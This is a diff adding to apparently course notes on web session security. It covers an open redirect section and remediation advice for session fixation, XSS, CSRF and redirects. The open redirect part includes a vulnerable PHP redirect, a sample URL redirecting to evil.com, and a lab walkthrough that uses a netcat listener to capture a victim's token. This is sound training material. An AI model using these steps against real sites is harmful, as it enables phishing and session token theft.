@@ -40,6 +40,21 @@
       - [Session Fixation \> CSRF](#session-fixation--csrf)
       - [Anti-CSRF Protection via the Referrer Header](#anti-csrf-protection-via-the-referrer-header)
       - [Bypass the RegEx](#bypass-the-regex)
+    - [Open Redirect](#open-redirect)
+      - [Example](#example-8)
+  - [Remediation Advice](#remediation-advice)
+    - [Session Hijacking](#session-hijacking-1)
+    - [Session Fixation](#session-fixation-1)
+      - [Examples](#examples)
+        - [PHP](#php-1)
+        - [Java](#java-1)
+        - [.NET](#net-1)
+    - [XSS](#xss-1)
+      - [Validation of User Input](#validation-of-user-input)
+      - [HTML Encoding to User-Controlled Output](#html-encoding-to-user-controlled-output)
+      - [Additional Instructions](#additional-instructions)
+    - [CSRF](#csrf-1)
+    - [Open Redirect](#open-redirect-1)
 
 ---
 
@@ -805,3 +820,161 @@ Suppose that the referrer header is checking for _google.com_. You could try som
 You can try some of the following as well:
 
 ```www.pwned.m3?www.target.com``` or ```www.pwned.m3/www.target.com```.
+
+### Open Redirect
+
+... vuln occurs when an attacker can redirect a victim to an attacker-controlled site by abusing a legitimate app's redirection functionality. In such cases, all the attacker has to do is specify a website under their control in a redirection URL of a legitimate website and pass this URL to the victim.
+
+Take a look:
+
+```php
+$red = $_GET['url'];
+header("Location: " . $red);
+```
+
+In the line of code above, a variable called ```red``` is defined that gets its value from a parameter called ```url```. ```$_GET``` is a PHP superglobal variable that enables you to access the ```url``` parameter value.
+
+The Location response header indicates the URL to redirect a page to. The line of code above sets the location to the value of ```red```, without any validation. You are facing an Open Redirect vuln here.
+
+The malicious URL an attacker would send leveraging the Open Redirect vuln would look as follows:
+
+```
+trusted.site/index.php?url=https://evil.com
+```
+
+#### Example
+
+If you enter an email account, you will notice that the application is eventually making a POST request to the page specified in the ```redirect_uri``` parameter. A ```token``` is also included in the POST request. This token could be a session or anti-CSRF token, and therefore, useful to an attacker.
+
+![session security redirect 1](../../../images/session_security_redirect1.png)
+
+Now, test if you can control the site where the ```redirect_uri``` parameter points to. In other words, check if the app performs the redirection without any kind of validation.
+
+Set up a Netcat listener.
+
+```bash
+d41y@htb[/htb]$ nc -lvnp 1337
+```
+
+Change the url from:
+
+```
+http://oredirect.htb.net/?redirect_uri=/complete.html&token=<RANDOM TOKEN ASSIGNED BY THE APP>
+```
+
+... to:
+
+```
+http://oredirect.htb.net/?redirect_uri=http://<VPN/TUN Adapter IP>:PORT&token=<RANDOM TOKEN ASSIGNED BY THE APP>
+```
+
+Open a new private window and navigate to the link.
+
+When the victim enters their email, you will notice a connection being made to your listener.
+
+![session security redirect 2](../../../images/session_security_redirect2.png)
+
+Open redirect vulns are usually exploited by attacker to create legitimate-looking phishing URLs. When a redirection functionality involves user tokens, attackers can also exploit open redirect vulns to obtain user tokens.
+
+## Remediation Advice
+
+### Session Hijacking
+
+User session monitoring/anomaly detection solutions can detect session hijacking. It is a safer bet to counter session hijacking by trying to eliminate all vulns mentioned above.
+
+### Session Fixation
+
+... can be remediated by generating a new session identifier upon an authenticated operation. Simply invalidating any pre-login session identifier and generating a new one post-login should be enough.
+
+#### Examples
+
+##### PHP
+
+```php
+session_regenerate_id(bool $delete_old_session = false): bool
+```
+
+The above updates the current session identifier with a newly generated one. The current session information is kept.
+
+##### Java
+
+```java
+...
+session.invalidate();
+session = request.getSession(true);
+...
+```
+
+The above invalidates the current session and gets a new session from the request object.
+
+##### .NET
+
+```c#
+...
+Session.Abandon();
+...
+```
+
+For session invalidation purposes, the .NET framework utilizes ```Session.Abandon();```, but there is a caveat. ```Session.Abandon();``` is not sufficient for this task. Microsoft: "When you abandon a session, the session ID cookie is not removed from the browser of the user. Therefore, as soon as the session has been abandoned, any new requests to the same application will use the same session ID but will have a new session state instance." So, to address session fixation holistically, one needs to utilize ```Session.Abandon();``` and overwrite the cookie header or implement more complex cookie-based session management by enriching the information held within and cookie and performing server-side checks.
+
+### XSS
+
+#### Validation of User Input
+
+The app should validate every input received immediately upon receiving it. Input validation should be performed on the server-side, using a positive approach (_limit the permitted input chars to chars that appear in a whitelist_), instead of a negative approach (_preventing the usage of chars that appear in a blacklist_), since the positive approach helps the programmer avoid potential flaws that result from mishandling potentially malicious chars. Input validation implementation must include the following validation principles in the following order:
+
+- verify the existence of actual input, do not accept null or empty values when the input is not optional
+- enforce input size restriction; make sure the input's length is within the expected range
+- validate the input type, make sure the data received is, in fact, the type expected
+- restrict the input range of values; the input's value should be within the acceptable range of values for the input's role in the application
+- sanitize special chars, unless there is a unique functional needed, the input char set should be limited to azAZ09
+- ensure logical input compliance
+
+#### HTML Encoding to User-Controlled Output
+
+The app should encode user-controlled input in the following cases:
+
+- prior to embedding user-controlled input within browser targeted output
+- prior to documenting user-controlled input into log files
+
+The following inputs match the user-controlled criteria:
+
+- dynamic values that originate directly from user input
+- user-controlled data repository values
+- session values originated directly from user input or user-controlled data repository values
+- values received from external entities
+- any other value which could have been affected by the user
+- the encoding process should verify that input matching the given criteria will be processed through a data sanitization component, which will replace non-alphanumerical chars in their HTML representation before including these values in the output sent to the user or the log file; this operation ensures that every script will be presented to the user rather than executed in the user's browser
+
+#### Additional Instructions
+
+- do not embed user input into client-side scripts; values deriving from user input should not be directly embedded as part of an HTML tag, script tag, HTML event, or HTML property
+- complimentary instructions for protecting the application against cross-site scripting can be found [here](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
+- a list of HTML encoded chars representations can be found [here](https://www.degraeve.com/reference/specialcharacters.php)
+
+>[!TIP]
+> Cookies should be marked as HTTPOnly for XSS attacks to not be able to capture them.
+
+### CSRF
+
+It is recommended that whenever a request is made to access each function, a check should be done to ensure the user is authenticated to perform that action.
+
+The preferred way to reduce the risk of a CSRF vuln is to modify session management mechanisms and implement additional, randomly generated, and non-predictable security tokens or responses to each HTTP request related to sensitive operations.
+
+Other mechanisms that can impede the ease of exploitation include: 
+
+- Referrer header checking
+- Performing verification on the order in which pages are called
+- Forcing sensitive functions to confirm information received
+
+In addition to the above, explicitly stating cookie usage with the [SameSite](https://web.dev/articles/samesite-cookies-explained) attribute can also prove an effective anti-CSRF-mechanism.
+
+### Open Redirect
+
+The safe use of redirects and forwards can be done in several ways:
+
+- do not use user-supplied URLs and have methods to strictly validate the URL
+- if user input cannot be avoided, ensure that the supplied value is valid, appropriate for the app, and is authorized for the user
+- it is recommended that any destination input be mapped to a value rather than the actual URL or portion of the URL and that server-side code translates this value to the target URL
+- sanitize input by creating a list of trusted URLs
+- force all redirects to first go through a page notifying users that they are being redirected from your site and require them to click a link to confirm
